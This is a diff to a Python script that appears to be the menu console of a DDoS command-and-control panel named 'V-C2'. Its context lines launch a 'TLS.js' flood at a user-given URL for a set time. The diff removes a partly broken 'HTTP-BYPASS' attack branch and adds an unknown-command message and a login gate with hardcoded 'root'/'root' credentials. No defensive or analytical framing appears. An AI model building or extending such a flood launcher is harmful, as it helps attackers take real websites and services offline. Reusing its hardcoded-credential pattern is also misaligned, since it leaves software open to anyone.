@@ -112,10 +112,30 @@ def main():
                 os.system(f'node TLS.js {url} {time}')
             except IndexError:
                 print('Usage: TLS <url> <time>')
-                print('Example: TLS http://example.com 20')
-         elif "HTTP-BYPASS"
-             try:
-                 url = cnc.split()[1]
+                print('Example: TLS http://example.com')
+        else:
+            try:
+                cmmnd = cnc.split()[0]
+                print("Command: [ " + cmmnd + " ] Not Found!")
+            except IndexError:
+                pass
+
+def login():
+    clear()
+    user = "root"
+    passwd = "root"
+    username = input("</> Username: ")
+    password = getpass.getpass(prompt='</> Password: ')
+    if username != user or password != passwd:
+        print("")
+        print("</> Invalid credentials! Abandoning...")
+        sys.exit(1)
+    elif username == user and password == passwd:
+        print("</> Welcome to  V-C2!")
+        time.sleep(0.3)
+        main()
+
+login()
                  
   
 
